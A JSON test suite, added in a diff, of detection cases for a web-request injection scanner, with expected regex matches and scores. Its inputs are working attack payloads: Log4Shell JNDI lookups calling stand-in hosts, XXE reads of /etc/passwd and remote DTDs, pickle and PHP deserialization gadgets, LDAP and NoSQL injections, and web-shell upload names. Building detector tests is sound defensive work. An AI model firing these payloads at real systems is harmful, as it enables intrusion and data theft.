@@ -1,0 +1,842 @@
+{
+  "suite": "misc_injection",
+  "kind": "detect",
+  "spec_version": "4.1.0",
+  "engine_version": "4.1.0",
+  "cases": [
+    {
+      "id": "log4shell_jndi_ldap",
+      "input": {
+        "content": "${jndi:ldap://10.0.0.1/a}",
+        "context": "header"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?i)\\$\\{(?:jndi:(?:ldap|rmi|dns)://|\\$?\\{?(?:lower|upper):j\\}ndi|::-j\\}ndi)",
+            "match": "${jndi:ldap://",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "\\$\\((?:[^()\\\\\\n]|\\\\.)*\\)|\\$\\{(?:[^{}\\\\\\n]|\\\\.)*\\}",
+            "match": "${jndi:ldap://10.0.0.1/a}",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "(?:^|\\s|/)(?:(?<=://)[^\\s/@]*@)?(?:localhost\\.?|127\\.0\\.0\\.1|0\\.0\\.0\\.0|\\[::(?:\\d*)\\]|\\[::ffff:127\\.0\\.0\\.1\\]|169\\.254(?:\\.\\d{1,3}){2}|192\\.168(?:\\.\\d{1,3}){2}|10(?:\\.\\d{1,3}){3}|172\\.(?:1[6-9]|2[0-9]|3[01])(?:\\.\\d{1,3}){2}|metadata\\.google\\.internal|metadata\\.goog|100\\.100\\.100\\.200)(?::\\d+)?(?:\\s|$|/)",
+            "match": "/10.0.0.1/",
+            "position": 13,
+            "category": "ssrf",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "://(?:[^/@\\s]*@)?((?:0[xX][0-9a-fA-F]+|0[0-7]+|[1-9]\\d*|0)(?:\\.(?:0[xX][0-9a-fA-F]+|0[0-7]+|[1-9]\\d*|0)){0,3})(?=[:/\\s]|$)",
+            "match": "://10.0.0.1",
+            "position": 11,
+            "category": "ssrf",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 25,
+        "processed_length": 25,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "log4shell_jndi_obfuscated",
+      "input": {
+        "content": "${${lower:j}ndi:${lower:l}dap://10.0.0.1/a}",
+        "context": "header"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?i)\\$\\{(?:jndi:(?:ldap|rmi|dns)://|\\$?\\{?(?:lower|upper):j\\}ndi|::-j\\}ndi)",
+            "match": "${${lower:j}ndi",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "\\$\\((?:[^()\\\\\\n]|\\\\.)*\\)|\\$\\{(?:[^{}\\\\\\n]|\\\\.)*\\}",
+            "match": "${lower:j}",
+            "position": 2,
+            "category": "cmd_injection",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "(?:^|\\s|/)(?:(?<=://)[^\\s/@]*@)?(?:localhost\\.?|127\\.0\\.0\\.1|0\\.0\\.0\\.0|\\[::(?:\\d*)\\]|\\[::ffff:127\\.0\\.0\\.1\\]|169\\.254(?:\\.\\d{1,3}){2}|192\\.168(?:\\.\\d{1,3}){2}|10(?:\\.\\d{1,3}){3}|172\\.(?:1[6-9]|2[0-9]|3[01])(?:\\.\\d{1,3}){2}|metadata\\.google\\.internal|metadata\\.goog|100\\.100\\.100\\.200)(?::\\d+)?(?:\\s|$|/)",
+            "match": "/10.0.0.1/",
+            "position": 31,
+            "category": "ssrf",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "://(?:[^/@\\s]*@)?((?:0[xX][0-9a-fA-F]+|0[0-7]+|[1-9]\\d*|0)(?:\\.(?:0[xX][0-9a-fA-F]+|0[0-7]+|[1-9]\\d*|0)){0,3})(?=[:/\\s]|$)",
+            "match": "://10.0.0.1",
+            "position": 29,
+            "category": "ssrf",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 43,
+        "processed_length": 43,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "log4shell_jndi_dns",
+      "input": {
+        "content": "${jndi:dns://lookup.evil/a}",
+        "context": "header"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?i)\\$\\{(?:jndi:(?:ldap|rmi|dns)://|\\$?\\{?(?:lower|upper):j\\}ndi|::-j\\}ndi)",
+            "match": "${jndi:dns://",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "\\$\\((?:[^()\\\\\\n]|\\\\.)*\\)|\\$\\{(?:[^{}\\\\\\n]|\\\\.)*\\}",
+            "match": "${jndi:dns://lookup.evil/a}",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 27,
+        "processed_length": 27,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "ldap_injection_uid",
+      "input": {
+        "content": "*)(uid=*))(|(uid=*",
+        "context": "query_param"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "\\([\\s]*[|&][\\s]*\\([^)(]+=[*]",
+            "match": "(|(uid=*",
+            "position": 10,
+            "category": "ldap",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "\\(\\s*[&|]\\s*",
+            "match": "(|",
+            "position": 10,
+            "category": "ldap",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "\\)\\s*\\(\\s*(?:[&|!]|(?::)?(?:[a-zA-Z][\\w.-]*|\\d+(?:\\.\\d+)*)(?:;[\\w.-]+)*(?::[\\w.-]+)*\\s*:?[=~<>])",
+            "match": ")(uid=",
+            "position": 1,
+            "category": "ldap",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "\\*\\)[|&]?\\(+\\s*(?::)?(?:[a-zA-Z][\\w.-]*|\\d+(?:\\.\\d+)*)(?:;[\\w.-]+)*(?::[\\w.-]+)*\\s*:?=",
+            "match": "*)(uid=",
+            "position": 0,
+            "category": "ldap",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "\\*\\s*\\)+\\s*(?:[|&!]\\s*)?\\(+\\s*(?:[&|!]|(?::)?(?:[a-zA-Z][\\w.-]*|\\d+(?:\\.\\d+)*)(?:;[\\w.-]+)*(?::[\\w.-]+)*\\s*:?=)",
+            "match": "*)(uid=",
+            "position": 0,
+            "category": "ldap",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 18,
+        "processed_length": 18,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "ldap_injection_password",
+      "input": {
+        "content": "admin*)((|password=*",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "\\(\\s*[&|]\\s*",
+            "match": "(|",
+            "position": 8,
+            "category": "ldap",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "\\*\\s*\\)+\\s*(?:[|&!]\\s*)?\\(+\\s*(?:[&|!]|(?::)?(?:[a-zA-Z][\\w.-]*|\\d+(?:\\.\\d+)*)(?:;[\\w.-]+)*(?::[\\w.-]+)*\\s*:?=)",
+            "match": "*)((|",
+            "position": 5,
+            "category": "ldap",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 20,
+        "processed_length": 20,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "nosql_gt_empty",
+      "input": {
+        "content": "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "\"\\$(?:gt|gte|lt|lte|ne|eq|in|nin|all|mod)\"\\s*:\\s*(?:\"\"|null|\\{|\\[)",
+            "match": "\"$gt\": \"\"",
+            "position": 14,
+            "category": "nosql",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 50,
+        "processed_length": 50,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "nosql_ne_null",
+      "input": {
+        "content": "[$ne]=1",
+        "context": "query_param"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "\\[\\$(?:where|gt|gte|lt|lte|ne|eq|regex|in|nin|nor|and|or|not|all|size|exists|type|mod|options|expr|function|elemMatch)\\]",
+            "match": "[$ne]",
+            "position": 0,
+            "category": "nosql",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 7,
+        "processed_length": 7,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "nosql_where_sleep",
+      "input": {
+        "content": "{\"$where\": \"sleep(5000) || true\"}",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "\"\\$(?:where|regex|expr|jsonSchema|function|accumulator|type|exists|size)\"\\s*:",
+            "match": "\"$where\":",
+            "position": 1,
+            "category": "nosql",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "(?i)(?:SLEEP\\s*\\(\\s*\\d+\\s*\\))",
+            "match": "sleep(5000)",
+            "position": 12,
+            "category": "sqli",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 33,
+        "processed_length": 33,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "nosql_or_tautology",
+      "input": {
+        "content": "' || 1==1//",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": false,
+        "threat_score": 0.0,
+        "threats": [],
+        "original_length": 11,
+        "processed_length": 11,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "deser_java_base64",
+      "input": {
+        "content": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?<![A-Za-z0-9+/])(?-i:rO0AB)",
+            "match": "rO0AB",
+            "position": 0,
+            "category": "deserialization",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 36,
+        "processed_length": 21,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "deser_pickle_reduce",
+      "input": {
+        "content": "cos\nsystem\n(S'id'\ntR.",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "\\b(?:eval|system|exec|shell_exec|passthru|popen|proc_open|create_function)\\s*\\(",
+            "match": "system (",
+            "position": 4,
+            "category": "cmd_injection",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "(c[A-Za-z_][A-Za-z0-9_]{0,100}(?:\\.[A-Za-z_][A-Za-z0-9_]{0,100}){0,20}\\n[A-Za-z_][A-Za-z0-9_]{0,100}\\n)[^ \\t]{0,100}?[Rb]",
+            "match": "cos\nsystem\n(S'id'\ntR",
+            "position": 0,
+            "category": "deserialization",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "cos\\n",
+            "match": "cos\n",
+            "position": 0,
+            "category": "deserialization",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 21,
+        "processed_length": 21,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "deser_php_object",
+      "input": {
+        "content": "O:8:\"Template\":1:{s:4:\"file\";s:11:\"/etc/passwd\";}",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "O:\\d+:\"",
+            "match": "O:8:\"",
+            "position": 0,
+            "category": "deserialization",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "\\A(?:(?!\\n).)*etc/(?:passwd|shadow|group|hosts|motd|issue|mysql/my\\.cnf|ssh/ssh_config)(?:[&#;,\\\"'<>]|\\s*\\Z)",
+            "match": "O:8:\"Template\":1:{s:4:\"file\";s:11:\"/etc/passwd\"",
+            "position": 0,
+            "category": "dir_traversal",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 49,
+        "processed_length": 49,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "deser_yaml_construct",
+      "input": {
+        "content": "!!python/object/apply:os.system ['id']",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": false,
+        "threat_score": 0.0,
+        "threats": [],
+        "original_length": 38,
+        "processed_length": 38,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "proto_pollution_dunder",
+      "input": {
+        "content": "{\"__proto__\": {\"isAdmin\": true}}",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?:__proto__|constructor)\\s*(?:\\[\\s*[\\\"']prototype[\\\"']\\s*\\]|\\.\\s*prototype)|[\\\"']__proto__[\\\"']\\s*:",
+            "match": "\"__proto__\":",
+            "position": 1,
+            "category": "proto_pollution",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 32,
+        "processed_length": 32,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "proto_pollution_bracket",
+      "input": {
+        "content": "__proto__[isAdmin]=1",
+        "context": "query_param"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "__proto__\\s*(?:\\[|\\.)|\\[\\s*[\\\"']?__proto__[\\\"']?\\s*\\]|constructor\\s*\\[\\s*[\\\"']?prototype[\\\"']?\\s*\\]|\\[\\s*[\\\"']?constructor[\\\"']?\\s*\\]\\s*\\[\\s*[\\\"']?prototype[\\\"']?\\s*\\]",
+            "match": "__proto__[",
+            "position": 0,
+            "category": "proto_pollution",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 20,
+        "processed_length": 20,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "proto_pollution_constructor",
+      "input": {
+        "content": "{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": false,
+        "threat_score": 0.0,
+        "threats": [],
+        "original_length": 49,
+        "processed_length": 49,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "http_split_crlf_cookie",
+      "input": {
+        "content": "en\r\nSet-Cookie: injected=1",
+        "context": "header"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "[\\r\\n][^\\S\\r\\n]*(?:HTTP\\/[0-9.]+|Location:|Set-Cookie:)",
+            "match": "\nSet-Cookie:",
+            "position": 3,
+            "category": "http_split",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 26,
+        "processed_length": 25,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "http_split_double_crlf",
+      "input": {
+        "content": "%0d%0a%0d%0aGET /admin HTTP/1.1",
+        "context": "query_param"
+      },
+      "expected": {
+        "is_threat": false,
+        "threat_score": 0.0,
+        "threats": [],
+        "original_length": 31,
+        "processed_length": 19,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "xml_xxe_file",
+      "input": {
+        "content": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "\\A(?:(?!\\n).)*etc/(?:passwd|shadow|group|hosts|motd|issue|mysql/my\\.cnf|ssh/ssh_config)(?:[&#;,\\\"'<>]|\\s*\\Z)",
+            "match": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\"",
+            "position": 0,
+            "category": "dir_traversal",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "(?:php|data|zip|rar|file|glob|expect|input|phpinfo|zlib|phar|ssh2|rar|ogg|expect)://[^\\s]+",
+            "match": "file:///etc/passwd\">]><r>&x;</r>",
+            "position": 53,
+            "category": "file_inclusion",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "(?:file|dict|gopher|jar|tftp)://[^\\s]+",
+            "match": "file:///etc/passwd\">]><r>&x;</r>",
+            "position": 53,
+            "category": "ssrf",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "<!(?:ENTITY|DOCTYPE)[^>]+SYSTEM[^>]+>",
+            "match": "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">",
+            "position": 21,
+            "category": "xml",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "<!DOCTYPE[^>\\[]*\\[[\\s\\S]*?<!ENTITY",
+            "match": "<!DOCTYPE r [<!ENTITY",
+            "position": 21,
+            "category": "xml",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 85,
+        "processed_length": 85,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "xml_xxe_remote",
+      "input": {
+        "content": "<!DOCTYPE r [<!ENTITY x SYSTEM \"http://10.0.0.1/evil.dtd\">]><r>&x;</r>",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?:^|\\s|/)(?:(?<=://)[^\\s/@]*@)?(?:localhost\\.?|127\\.0\\.0\\.1|0\\.0\\.0\\.0|\\[::(?:\\d*)\\]|\\[::ffff:127\\.0\\.0\\.1\\]|169\\.254(?:\\.\\d{1,3}){2}|192\\.168(?:\\.\\d{1,3}){2}|10(?:\\.\\d{1,3}){3}|172\\.(?:1[6-9]|2[0-9]|3[01])(?:\\.\\d{1,3}){2}|metadata\\.google\\.internal|metadata\\.goog|100\\.100\\.100\\.200)(?::\\d+)?(?:\\s|$|/)",
+            "match": "/10.0.0.1/",
+            "position": 38,
+            "category": "ssrf",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "://(?:[^/@\\s]*@)?((?:0[xX][0-9a-fA-F]+|0[0-7]+|[1-9]\\d*|0)(?:\\.(?:0[xX][0-9a-fA-F]+|0[0-7]+|[1-9]\\d*|0)){0,3})(?=[:/\\s]|$)",
+            "match": "://10.0.0.1",
+            "position": 36,
+            "category": "ssrf",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "<!(?:ENTITY|DOCTYPE)[^>]+SYSTEM[^>]+>",
+            "match": "<!DOCTYPE r [<!ENTITY x SYSTEM \"http://10.0.0.1/evil.dtd\">",
+            "position": 0,
+            "category": "xml",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "<!DOCTYPE[^>\\[]*\\[[\\s\\S]*?<!ENTITY",
+            "match": "<!DOCTYPE r [<!ENTITY",
+            "position": 0,
+            "category": "xml",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 70,
+        "processed_length": 70,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "template_jinja_expr",
+      "input": {
+        "content": "{{ 7 * 7 }}",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "\\{\\{(?![^\\}]*\\d{4}-\\d{1,2}-\\d{1,2}(?!\\d))(?=[^\\}]*(?:@[\\w.]+@|\\b\\w+\\(\\s*\\)|['\\\"]?\\d+['\\\"]?\\s*[*/%+\\-]\\s*['\\\"]?\\d+['\\\"]?))[^\\}]*\\}\\}",
+            "match": "{{ 7 * 7 }}",
+            "position": 0,
+            "category": "template",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 11,
+        "processed_length": 11,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "template_dollar_brace",
+      "input": {
+        "content": "${7 * 7}",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "\\$\\((?:[^()\\\\\\n]|\\\\.)*\\)|\\$\\{(?:[^{}\\\\\\n]|\\\\.)*\\}",
+            "match": "${7 * 7}",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "\\$\\{[^}]*(?:@[\\w.]+@|\\b\\w+\\s*\\(|\\d+\\s*[*/%+\\-]\\s*\\d+)[^}]*\\}",
+            "match": "${7 * 7}",
+            "position": 0,
+            "category": "template",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 8,
+        "processed_length": 8,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "template_asp_eval",
+      "input": {
+        "content": "<%= 7 * 7 %>",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?i)<%[=#]?[^%]*(?:system|exec|eval|`|Runtime|IO\\.|File\\.|Dir\\.|\\d+\\s*[-+*/]\\s*\\d+)[^%]*%>",
+            "match": "<%= 7 * 7 %>",
+            "position": 0,
+            "category": "template",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 12,
+        "processed_length": 12,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "template_velocity_set",
+      "input": {
+        "content": "#set($x = 7 * 7)$x",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": false,
+        "threat_score": 0.0,
+        "threats": [],
+        "original_length": 18,
+        "processed_length": 17,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "code_injection_eval_request",
+      "input": {
+        "content": "eval(request.getParameter('c'))",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "\\b(?:eval|system|exec|shell_exec|passthru|popen|proc_open|create_function)\\s*\\(",
+            "match": "eval(",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 31,
+        "processed_length": 31,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "code_injection_system_diagnostics",
+      "input": {
+        "content": "System.Diagnostics.Process.Start(\"cmd.exe\")",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "System\\.Diagnostics\\.Process\\.Start\\s*\\(|System\\.Reflection\\.|Assembly\\.Load\\s*\\(",
+            "match": "System.Diagnostics.Process.Start(",
+            "position": 0,
+            "category": "code_injection",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 43,
+        "processed_length": 43,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "file_upload_double_ext",
+      "input": {
+        "content": "filename=\"shell.php.jpg\"",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?:\\A|[;,:\\n])\\s*filename\\s*=\\s*[\\\"'][^\\\"']*\\.(?:php\\d*|phtml|shtml|asax|ascx|ashx|asmx|aspx|bash|jspx|phar|phps|asa|asp|bat|cer|cfc|cfm|cgi|cmd|exe|hta|jsp|msi|pht|vbe|vbs|war|wsf|js|pl|py|rb|sh|ws)(?![A-Za-z0-9])(?:[^ \\\"'][^\\\"']*)?\\.(?:docx|jpeg|pptx|tiff|webm|webp|xlsx|avi|bmp|doc|gif|ico|jpg|mkv|mov|mp3|mp4|odt|pdf|png|ppt|svg|tif|wav|xls)[\\\"']",
+            "match": "filename=\"shell.php.jpg\"",
+            "position": 0,
+            "category": "file_upload",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 24,
+        "processed_length": 24,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "file_upload_php_ext",
+      "input": {
+        "content": "filename=\"shell.phtml\"",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?:\\A|[;,:\\n])\\s*filename\\s*=\\s*[\\\"'][^\\\"']*\\.(?:php\\d*|phtml|shtml|asax|ascx|ashx|asmx|aspx|bash|jspx|phar|phps|asa|asp|bat|cer|cfc|cfm|cgi|cmd|com|exe|hta|jsp|msi|pht|vbe|vbs|war|wsf|js|pl|py|rb|sh|ws)[\\\"']",
+            "match": "filename=\"shell.phtml\"",
+            "position": 0,
+            "category": "file_upload",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 22,
+        "processed_length": 22,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "file_upload_htaccess",
+      "input": {
+        "content": "filename=\".htaccess\"",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": false,
+        "threat_score": 0.0,
+        "threats": [],
+        "original_length": 20,
+        "processed_length": 20,
+        "detection_method": "enhanced"
+      }
+    }
+  ]
+}
